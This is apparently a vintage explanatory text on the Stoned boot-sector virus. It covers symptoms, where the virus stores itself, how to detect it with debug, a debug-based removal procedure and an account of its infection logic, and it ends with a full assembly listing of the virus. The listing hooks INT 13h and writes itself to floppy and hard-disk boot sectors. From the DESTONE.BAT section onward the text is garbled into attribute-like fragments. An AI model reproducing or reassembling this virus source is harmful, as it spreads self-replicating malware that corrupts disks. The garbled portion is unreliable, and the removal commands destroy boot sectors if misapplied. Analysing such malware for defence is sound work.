

         An Explanation of how the Stoned Virus operates

                Mike Lawrie (rures@hippo.ru.ac.za)



Notation

Cylinders, heads and drives are numbered from zero, sectors are
numbered from one.


1. Characteristics of the Stoned Virus

A PC that is infected with the Stoned virus will occasionally
display, at boot time, the message "Your PC is now Stoned!". This
message will never display if the booting is from the hard disk,
but only from a floppy disk, so you will never be informed that
your hard disk is infected.

Having booted with an infected disk (hard or floppy), subsequent
writes to a floppy in drive A: will cause that floppy to be
infected.

An infected hard-disk will in all likelihood suffer no ill-
effects, but a 360Kb floppy disk that is infected will have
problems if there are many files in the root directory. The last
sector of the directory gets corrupted by the virus.

It is quite safe to put an infected floppy into a PC - it will
not cause any problems. The infection takes place ONLY AT BOOT
TIME, so be careful about how you boot the PC.

If your hard disk is infected, then boot off a disinfected floppy
and clean up your hard disk as soon as possible.


2. Where the virus is stored

The virus is stored in the boot sector of a disk, and the boot
code is stored elsewhere. In the case of a hard disk system, the
'elsewhere' is cylinder 0, sector 7, head 0; in the case of a
floppy, it is cylinder 0, sector 3, head 1.


3. Propogation

The virus loads into memory each time the PC is booted from an
infected disk (hard or floppy). Once it is memory resident (it
grabs 2 Kb of RAM), then each and every time that there is a disk
write, the target disk is checked to see if the virus is
installed. If it is not installed, then it installs itself
immediately and without notification.


4. Confirmation

You can confirm that your disks are free of the virus by looking
at the boot sectors of the disk.


4.1 Floppy

Use debug to read the boot sector, as follows:-

a:>  debug

- L 0 0 0 1

- D 180

- Q

If the display produced by the 'd180' shows the text "Your PC is
now Stoned!", then that disk is infected.


4.2 Hard disk

You cannot use debug, because debug reads only relative to the
start of the DOS partition, and you need to read and alter the
boot partition which is an absolute sector. Use a utility that
allows absolute disk reads, such as one of the Norton advanced
utilities. Do a read and display of absolute sector zero of the
hard drive, and look at bytes 0x18a onwards for the text "Your PC
is now Stoned!".

5. How to get rid of the virus

You must clear the virus off ALL disks from which you will boot
your computer. It is quite safe to put an infected disk into the
computer, as long as you do not boot from that disk.

If you accidently boot from an infected disk, then your hard disk
will be infected immediately, and ANY writing that you do to a
floppy disk will cause that disk to be infected. This takes you
back to square one.


5.1 Floppy system

The algorithm for doing this with debug is:-

5.1.1. Read the first few sectors from the disk into RAM

5.1.2. Move the boot code to where it belongs

5.1.3. Zeroise the boot code that is in the wrong position

5.1.4. Write the first few sectors back to the disk


The commands are best put into a .BAT file, and redirection used.
Here are two files that work together. (Blank lines have been
inserted only for clarity - do not put them into the .DAT file).


DESTONE.BAT

      debug < destone.dat="" destone.dat="" l="" 0="" 0="" 0="" 10="" m="" ds:1600="" 17ff="" ds:0="" f="" ds:1600="" 17ff="" 0="" w="" 0="" 0="" 0="" 10="" q="" to="" use="" this="" system,="" boot="" your="" computer="" with="" a="" disk="" that="" is="" not="" infected,="" then="" insert="" an="" infected="" disk="" into="" drive="" a:,="" and="" type="" destone.="" if="" you="" cannot="" work="" out="" which="" disk="" to="" put="" the="" destone.?at="" files="" onto,="" you="" should="" not="" be="" attempting="" this="" procedure.="" nb!="" this="" is="" a="" potentially="" dangerous="" method="" of="" using="" debug.="" test="" this="" process="" very="" carefully="" on="" a="" test="" disk="" that="" has="" been="" infected.="" do="" not="" use="" this="" process="" on="" a="" disk="" that="" is="" not="" infected!!!="" you="" will="" destroy="" the="" boot="" sector.="" (the="" dos="" 'sys'="" command="" will="" re-="" instate="" it="" for="" you).="" 5.2="" hard="" disk="" system="" the="" principle="" is="" much="" the="" same="" as="" for="" a="" floppy="" disk="" system,="" except="" that="" there="" is="" probably="" no="" need="" to="" zeroise="" the="" boot="" code="" that="" is="" stored="" on="" cylinder="" 0,="" sector="" 7,="" head="" 0.="" caveat="" for="" hard="" disk="" system="" if="" the="" partition="" table="" has="" been="" altered="" subsequent="" to="" the="" time="" at="" which="" the="" virus="" infected="" the="" hard="" disk,="" then="" simply="" moving="" the="" cylinder="" 0,="" sector="" 7,="" head="" 0="" code="" into="" the="" boot="" sector="" will="" destroy="" the="" hard="" disk="" partitions.="" the="" way="" around="" this="" is="" to="" compare="" the="" bytes="" from="" 0x1be="" to="" 0x1ff="" in="" the="" boot="" sector="" (ie="" the="" cylinder="" 0,="" sector="" 1,="" head="" 0)="" against="" the="" corresponding="" bytes="" in="" sector="" 7.="" if="" there="" is="" a="" difference,="" then="" copy="" those="" values="" from="" sector="" 1="" into="" sector="" 7="" before="" writing="" all="" of="" sector="" 7="" to="" sector="" 1.="" 6.="" how="" the="" virus="" operates="" when="" booting="" from="" an="" infected="" hard="" disk,="" the="" virus="" simply="" becomes="" memory="" resident,="" as="" described="" below.="" the="" complexity="" of="" the="" booting="" applies="" only="" to="" booting="" from="" floppies.="" suppose="" that="" a="" pc="" is="" being="" booted="" from="" an="" infected="" floppy="" disk.="" the="" virus="" executes="" before="" the="" boot="" process="" gets="" going,="" and="" writes="" itself="" into="" a="" reserved="" area="" of="" memory="" as="" well="" as="" to="" the="" boot="" sector="" of="" the="" hard="" disk="" -="" having="" moved="" the="" proper="" hard="" disk="" boot="" program="" to="" a="" 'hidden'="" sector.="" any="" subseqent="" write="" to="" floppy="" drive="" a:="" will="" cause="" the="" virus="" to="" install="" itself="" onto="" the="" floppy="" drive="" in="" the="" floppy="" boot="" sector="" -="" having="" likewise="" moved="" the="" proper="" floppy="" disk="" boot="" program="" to="" a="" 'hidden'="" sector="" (actually,="" not="" so="" hidden).="" the="" first="" sector="" from="" the="" disk="" (ie="" the="" boot="" sector,="" aka="" cyl="" 0,="" sec="" 1,="" hd="" 0)="" is="" read="" into="" ram="" at="" 0000:7c00.="" in="" this="" case="" the="" virus="" code="" is="" read="" in,="" rather="" than="" the="" boot="" program,="" because="" the="" disk="" is="" infected.="" the="" code="" executes="" to="" address="" 00a1,="" (ie="" absolute="" 0000:7ca1),="" and="" does="" the="" following:-="" copies="" the="" int="" 13="" vector="" (disk="" i/o)="" into="" the="" virus="" code="" grabs="" 2="" kb="" of="" ram="" from="" dos="" sets="" int="" 13="" to="" point="" to="" code="" in="" the="" virus="" in="" the="" grabbed="" 2="" kb="" moves="" itself="" into="" that="" 2="" kb,="" and="" stays="" resident="" the="" code="" is="" now="" installed="" high="" in="" ram,="" let's="" call="" the="" segment,="" say,="" top.="" execution="" continues="" at="" top:00e4.="" nothing="" has="" yet="" happened="" about="" booting="" dos,="" that="" is="" still="" to="" come="" when="" the="" virus="" is="" good="" and="" ready.="" the="" code="" continues:-="" reset="" the="" disk="" system="" read="" the="" boot="" code="" from="" the="" 'hidden'="" sector="" into="" ram="" at="" 0000:7c00="" (if="" booted="" from="" hard="" disk="" use="" cyl="" 0="" sec="" 7="" hd="" 0,="" else="" use="" cyl="" 0="" sec="" 3="" hd="" 1)="" if="" booting="" from="" a="" hard="" disk,="" go="" straight="" to="" the="" boot="" code="" in="" ram="" at="" 0000:7c00="" (clearly,="" the="" virus="" is="" already="" installed="" on="" the="" hard="" disk)="" if="" the="" dos="" timer="" low="" byte="" equals="" xxxxx000,="" show="" the="" stoned="" message="" attempt="" to="" read="" the="" boot="" sector="" from="" the="" hard="" drive="" into="" a="" buffer="" if="" the="" read="" has="" an="" error,="" don't="" do="" anything="" fancy,="" go="" straight="" to="" the="" boot="" code="" in="" ram="" at="" 0000:7c00="" if="" the="" read="" is="" error-free,="" see="" if="" the="" boot="" sector="" has="" the="" virus="" stored="" on="" it.="" if="" the="" virus="" is="" stored="" on="" the="" hard="" disk,="" then="" go="" to="" the="" boot="" code="" in="" ram="" at="" 0000:7c00="" store="" the="" virus="" onto="" the="" hard="" disk="" by="" moving="" the="" boot="" code="" to="" cyl="" 0="" sec="" 7="" hd="" 0,="" move="" the="" partition="" table="" to="" the="" end="" of="" the="" virus="" code,="" and="" writing="" the="" virus="" to="" the="" boot="" sector="" at="" cyl="" 0="" sec="" 1="" hd="" 0="" go="" to="" the="" boot="" code="" in="" ram="" at="" 0000:7c00="" the="" dos="" boot="" will="" now="" proceed="" normally,="" but="" note="" that="" the="" int="" 13="" vector="" is="" pointing="" to="" the="" memory="" resident="" virus="" code.="" thus="" any="" later="" redirecting="" by="" other="" systems="" (eg="" dos="" itself)="" will="" probably="" preserve="" the="" bad="" int="" 13="" (it="" is="" not="" possible="" to="" preserve="" the="" good="" one,="" the="" virus="" gobbled="" it="" up="" *before*="" the="" system="" executed="" the="" boot="" code).="" thus,="" any="" subsequent="" disk="" requests="" sent="" via="" int="" 13="" (ie="" the="" vast="" majority="" of="" them)="" will="" be="" inspected="" by="" the="" memory="" resident="" virus="" code.="" let's="" now="" look="" at="" what="" the="" memory="" resident="" virus="" code="" does="" to="" all="" int="" 13's.="" int="" 13="" points="" to="" top:0015,="" where="" top="" is="" the="" segment="" address="" of="" the="" memory="" resident="" virus.="" of="" course,="" dos="" might="" have="" tried="" to="" intercept="" int="" 13="" also,="" so="" if="" you="" look="" at="" the="" int="" 13="" vector,="" you="" might="" see="" it="" pointing="" to="" dos,="" and="" hidden="" in="" dos="" will="" be="" the="" vector="" to="" top:0015.="" the="" memory="" resident="" algorithm="" is="" as="" follows:-="" trap="" all="" int="" 13's="" (ie="" low="" level="" disk="" accesses)="" ignore="" all="" but="" floppy="" disk="" write="" requests="" on="" drive="" a:="" if="" the="" disk="" motor="" is="" not="" running,="" do="" a="" normal="" int="" 13="" have="" up="" to="" 4="" attempts="" to="" read="" the="" boot="" sector="" cyl="" 0="" sec="" 1="" hd="" 0,="" give="" up="" if="" errors="" occur="" if="" the="" virus="" is="" already="" installed="" on="" the="" floppy="" disk,="" drop="" through="" to="" a="" proper="" int="" 13="" write="" the="" boot="" sector="" to="" the="" hidden="" area="" (cyl="" 0="" sec="" 3="" hd="" 1="" for="" floppy)="" ----------------------------------------------------="" ;the="" stoned="" virus!="" int13_off="" equ="" 0004ch="" ;interrupt="" 13h="" location="" int13_seg="" equ="" 0004eh="" virus="" segment="" byte="" assume="" cs:virus,="" ds:virus,="" es:virus,="" ss:virus="" ;*****************************************************************************="" ;the="" following="" jump="" instruction="" is="" only="" needed="" to="" be="" able="" to="" generate="" a="" com="" ;file="" with="" this="" assembly="" listing.="" org="" 100h="" start:="" jmp="" near="" ptr="" start1="" ;the="" following="" three="" definitions="" are="" bios="" data="" that="" are="" used="" by="" the="" virus="" org="" 413h="" mem_size="" dw="" ;memory="" size="" in="" kilobytes="" org="" 43fh="" motor_status="" db="" ;floppy="" disk="" motor="" status="" org="" 46ch="" timer="" dd="" ;pc="" 55ms="" timer="" count="" ;*****************************************************************************="" org="" 7c00h="" ;this="" is="" the="" stoned="" boot="" sector="" virus.="" the="" jump="" instructions="" here="" just="" go="" ;past="" the="" data="" area="" and="" the="" viral="" interrupt="" 13h="" handler.="" the="" first="" four="" ;bytes="" of="" this="" code,="" ea="" 05="" 00="" 0c,="" also="" serve="" the="" virus="" to="" identify="" itself="" ;on="" a="" floppy="" disk="" or="" the="" hard="" disk.="" start1:="" db="" 0eah,5,0,0c0h,7="" ;jmp="" far="" ptr="" start2="" start2:="" jmp="" near="" ptr="" start3="" ;go="" to="" startup="" routine="" ;*****************************************************************************="" ;data="" area="" for="" the="" virus="" drive_no="" db="" 0="" ;which="" drive="" is="" being="" booted="" old_int13_off="" dw="" 0="" ;bios="" int="" 13="" handler="" offset="" old_int13_seg="" dw="" 0="" ;bios="" int="" 13="" handler="" segment="" himem_ofs="" dw="" offset="" himem="" -="" 7c00h="" ;viral="" int="" 13="" handler="" offset="" himem_seg="" dw="" 0="" ;viral="" int="" 13="" handler="" segment="" boot_sec_start="" dd="" 00007c00h="" ;boot="" sector="" boot="" address="" ;*****************************************************************************="" ;this="" is="" the="" viral="" interrupt="" 13h="" handler.="" it="" simply="" looks="" for="" attempts="" to="" ;read="" or="" write="" to="" the="" floppy="" disk.="" any="" reads="" or="" writes="" to="" the="" floppy="" get="" ;trapped="" and="" the="" infect_floppy="" routine="" is="" first="" called.="" int_13h:="" push="" ds="" ;viral="" int="" 13h="" handler="" push="" ax="" cmp="" ah,2="" ;look="" for="" functions="" 2="" &="" 3="" jb="" goto_bios="" ;else="" go="" to="" bios="" int="" 13="" handler="" cmp="" ah,4="" jnb="" goto_bios="" or="" dl,dl="" ;are="" we="" reading="" disk="" 0?="" jne="" goto_bios="" ;no,="" go="" to="" bios="" int="" 13="" handler="" xor="" ax,ax="" ;yes,="" activate="" virus="" now="" mov="" ds,ax="" ;set="" ds="0" mov="" al,[motor_status]="" ;disk="" motor="" status="" test="" al,1="" ;is="" motor="" on="" drive="" 0="" running?="" jnz="" goto_bios="" ;yes,="" let="" bios="" handle="" it="" call="" infect_floppy="" ;go="" infect="" the="" floppy="" disk="" in="" a="" goto_bios:="" pop="" ax="" ;restore="" ax="" and="" ds="" pop="" ds="" ;and="" let="" bios="" do="" the="" read/write="" jmp="" dword="" ptr="" cs:[old_int13_off-7c00h]="" ;jump="" to="" old="" int="" 13="" ;*****************************************************************************="" ;this="" routine="" infects="" the="" floppy="" in="" the="" a="" drive.="" it="" first="" checks="" the="" floppy="" to="" ;make="" sure="" it="" is="" not="" already="" infected,="" by="" reading="" the="" boot="" sector="" from="" it="" into="" ;memory,="" and="" comparing="" the="" first="" four="" bytes="" with="" the="" first="" four="" bytes="" of="" the="" ;viral="" boot="" sector,="" which="" is="" already="" in="" memory.="" if="" they="" are="" not="" the="" same,="" ;the="" infection="" routine="" rewrites="" the="" original="" boot="" sector="" to="" cyl="" 0,="" hd="" 1,="" sec="" 3="" ;which="" is="" the="" last="" sector="" in="" the="" root="" directory.="" as="" long="" as="" the="" root="" directory="" ;has="" less="" than="" __="" entries="" in="" it,="" there="" is="" no="" problem="" in="" doing="" this.="" then,="" ;the="" virus="" writes="" itself="" to="" cyl="" 0,="" hd="" 0,="" sec="" 1,="" the="" actual="" boot="" sector.="" infect_floppy:="" push="" bx="" ;save="" everything="" push="" cx="" push="" dx="" push="" es="" push="" si="" push="" di="" mov="" si,4="" ;retry="" counter="" read_loop:="" mov="" ax,201h="" ;read="" boot="" sector="" from="" floppy="" push="" cs="" pop="" es="" ;es="cs" (here)="" mov="" bx,200h="" ;read="" to="" buffer="" at="" end="" of="" virus="" xor="" cx,cx="" ;dx="cx=0" mov="" dx,cx="" ;read="" cyl="" 0,="" hd="" 0,="" sec="" 1,="" inc="" cx="" ;the="" floppy="" boot="" sector="" pushf="" ;fake="" an="" int="" 13h="" with="" push/call="" call="" dword="" ptr="" cs:[old_int13_off-7c00h]="" jnc="" check_boot_sec="" ;if="" no="" error="" go="" check="" bs="" out="" xor="" ax,ax="" ;error,="" attempt="" disk="" reset="" pushf="" ;fake="" an="" int="" 13h="" again="" call="" dword="" ptr="" cs:[old_int13_off-7c00h]="" dec="" si="" ;decrement="" retry="" counter="" jnz="" read_loop="" ;and="" try="" again="" if="" counter="" ok="" jmp="" short="" exit_infect="" ;read="" failed,="" get="" out="" nop="" ;here="" we="" determine="" if="" the="" boot="" sector="" from="" the="" floppy="" is="" already="" infected="" check_boot_sec:="" xor="" si,si="" ;si="" points="" to="" the="" virus="" in="" ram="" mov="" di,200h="" ;di="" points="" to="" bs="" in="" question="" cld="" push="" cs="" ;ds="cs" pop="" ds="" lodsw="" ;compare="" first="" four="" bytes="" of="" cmp="" ax,[di]="" ;the="" virus="" to="" see="" if="" the="" same="" jne="" write_virus="" ;no,="" go="" put="" the="" virus="" on="" floppy="" lodsw="" cmp="" ax,[di+2]="" je="" exit_infect="" ;the="" same,="" already="" infected="" write_virus:="" mov="" ax,301h="" ;write="" virus="" to="" floppy="" a:="" mov="" bx,200h="" ;first="" put="" orig="" boot="" sec="" mov="" cl,3="" ;to="" cyl="" 0,="" hd="" 1,="" sec="" 3="" mov="" dh,1="" ;this="" is="" the="" last="" sector="" in="" the="" pushf="" ;root="" directory="" call="" dword="" ptr="" cs:[old_int13_off-7c00h]="" ;fake="" int="" 13="" jc="" exit_infect="" ;if="" an="" error,="" just="" get="" out="" mov="" ax,301h="" ;else="" write="" viral="" boot="" sec="" xor="" bx,bx="" ;to="" cyl="" 0,="" hd="" 0,="" sec="" 1="" mov="" cl,1="" ;from="" right="" here="" in="" ram="" xor="" dx,dx="" pushf="" ;fake="" an="" int="" 13="" to="" rom="" bios="" call="" dword="" ptr="" cs:[old_int13_off-7c00h]="" exit_infect:="" pop="" di="" ;exit="" the="" infect="" routine="" pop="" si="" ;restore="" everything="" pop="" es="" pop="" dx="" pop="" cx="" pop="" bx="" ret="" ;*****************************************************************************="" ;this="" is="" the="" start-up="" code="" for="" the="" viral="" boot="" sector,="" which="" is="" executed="" when="" ;the="" system="" boots="" up.="" start3:="" xor="" ax,ax="" ;stoned="" boot="" sector="" start-up="" mov="" ds,ax="" ;set="" ds="ss=0" cli="" ;ints="" off="" for="" stack="" change="" mov="" ss,ax="" mov="" sp,7c00h="" ;initialize="" stack="" to="" 0000:7c00="" sti="" mov="" ax,word="" ptr="" ds:[int13_off]="" ;get="" current="" int="" 13h="" vector="" mov="" [old_int13_off],ax="" ;and="" save="" it="" here="" mov="" ax,word="" ptr="" ds:[int13_seg]="" mov="" [old_int13_seg],ax="" mov="" ax,[mem_size]="" ;get="" memory="" size="" in="" 1k="" blocks="" dec="" ax="" ;subtract="" 2k="" from="" it="" dec="" ax="" mov="" [mem_size],ax="" ;save="" it="" back="" mov="" cl,6="" ;convert="" mem="" size="" to="" segment="" shl="" ax,cl="" ;value="" mov="" es,ax="" ;and="" put="" it="" in="" es="" mov="" [himem_seg],ax="" ;save="" segment="" here="" mov="" ax,offset="" int_13h="" -="" 7c00h="" ;now="" hook="" interrupt="" 13h="" mov="" word="" ptr="" ds:[int13_off],ax="" ;into="" high="" memory="" mov="" word="" ptr="" ds:[int13_seg],es="" mov="" cx,offset="" end_virus="" -="" 7c00h="" ;move="" this="" much="" to="" hi="" mem="" push="" cs="" pop="" ds="" ;cs="7C0H" from="" far="" jmp="" at="" start="" xor="" si,si="" ;si="di=0" mov="" di,si="" cld="" rep="" movsb="" ;move="" virus="" to="" high="" memory="" jmp="" dword="" ptr="" cs:[himem_ofs-7c00h]="" ;and="" go="" there="" himem:="" mov="" ax,0="" ;reset="" disk="" drive="" int="" 13h="" xor="" ax,ax="" mov="" es,ax="" ;es="0" mov="" ax,201h="" ;prep="" to="" load="" orig="" boot="" sector="" mov="" bx,7c00h="" cmp="" byte="" ptr="" cs:[drive_no-7c00h],0="" ;which="" drive="" booting="" from="" je="" floppy_boot="" ;ok,="" booting="" from="" floppy,="" do="" it="" hard_boot:="" mov="" cx,7="" ;else="" booting="" from="" hard="" disk="" mov="" dx,80h="" ;read="" cyl="" 0,="" hd="" 0,="" sec="" 7="" int="" 13h="" ;where="" orig="" part="" sec="" is="" stored="" jmp="" short="" go_boot="" ;and="" jump="" to="" it="" nop="" floppy_boot:="" mov="" cx,3="" ;booting="" from="" floppy="" mov="" dx,100h="" ;read="" cyl="" 0,="" hd="" 1,="" sec="" 3="" int="" 13h="" ;where="" orig="" boot="" sec="" is="" jc="" go_boot="" ;if="" an="" error="" go="" to="" trash!!="" test="" byte="" ptr="" es:[timer],7="" ;message="" display="" one="" in="" 8="" jnz="" message_done="" ;times,="" else="" none="" mov="" si,offset="" stoned_msg1="" -="" 7c00h="" ;play="" the="" message="" push="" cs="" pop="" ds="" ;ds="cs" msg_loop:="" lodsb="" ;get="" a="" byte="" to="" al="" or="" al,al="" ;al="0?" jz="" message_done="" ;yes,="" all="" done="" mov="" ah,0eh="" ;display="" byte="" using="" bios="" mov="" bh,0="" int="" 10h="" jmp="" short="" msg_loop="" ;and="" go="" get="" another="" message_done:="" push="" cs="" pop="" es="" ;es="cs" mov="" ax,201h="" ;attempt="" to="" read="" hard="" disk="" bs="" mov="" bx,200h="" ;to="" infect="" it="" if="" it="" hasn't="" been="" mov="" cl,1="" mov="" dx,80h="" int="" 13h="" jc="" go_boot="" ;try="" boot="" if="" error="" reading="" push="" cs="" pop="" ds="" ;check="" 1st="" 4="" bytes="" of="" hd="" bs="" mov="" si,200h="" ;to="" see="" if="" it's="" infected="" yet="" mov="" di,0="" lodsw="" cmp="" ax,[di]="" ;check="" 2="" bytes="" jne="" infect_hard_disk="" ;not="" the="" same,="" go="" infect="" hd="" lodsw="" cmp="" ax,[di+2]="" ;check="" next="" 2="" bytes="" jne="" infect_hard_disk="" ;not="" the="" same,="" go="" infect="" hd="" go_boot:="" mov="" cs:[drive_no-7c00h],0="" ;zero="" this="" for="" floppy="" infects="" jmp="" cs:[boot_sec_start-7c00h]="" ;jump="" to="" 0000:7c00="" infect_hard_disk:="" mov="" cs:[drive_no-7c00h],2="" ;flag="" to="" indicate="" bs="" on="" hd="" mov="" ax,301h="" ;write="" orig="" part="" sec="" here="" mov="" bx,200h="" ;(cyl="" 0,="" hd="" 0,="" sec="" 7)="" mov="" cx,7="" mov="" dx,80h="" int="" 13h="" jc="" go_boot="" ;error,="" abort="" push="" cs="" pop="" ds="" push="" cs="" pop="" es="" ;ds="cs=es=high" memory="" mov="" si,offset="" part_table="" -="" 7c00h="" +="" 200h="" mov="" di,offset="" part_table="" -="" 7c00h="" ;move="" partition="" tbl="" into="" mov="" cx,242h="" ;viral="" boot="" sector="" rep="" movsb="" ;242h="" move="" clears="" orig="" bs="" in="" ram="" mov="" ax,0301h="" ;write="" it="" to="" the="" partition="" bs="" xor="" bx,bx="" ;at="" cyl="" 0,="" hd="" 0,="" sec="" 1="" inc="" cl="" int="" 13h="" jmp="" short="" go_boot="" ;and="" jump="" to="" original="" boot="" sec="" ;*****************************************************************************="" ;messages="" and="" blank="" space="" stoned_msg1="" db="" 7,'your="" pc="" is="" now="" stoned!',7,0dh,0ah,0ah,0="" stoned_msg2="" db="" 'legalise="" marijuana!'="" end_virus:="" ;end="" of="" the="" virus="" db="" 0,0,0,0,0,0="" ;blank="" space,="" not="" used="" part_table:="" ;space="" for="" hd="" partition="" table="" db="" 16="" dup="" (0)="" ;partition="" 1="" entry="" db="" 16="" dup="" (0)="" ;partition="" 2="" entry="" db="" 16="" dup="" (0)="" ;partition="" 3="" entry="" db="" 16="" dup="" (0)="" ;partition="" 4="" entry="" db="" 0,0="" ;usually="" 55="" aa="" boot="" sec="" id="" virus="" ends="" end="" start="">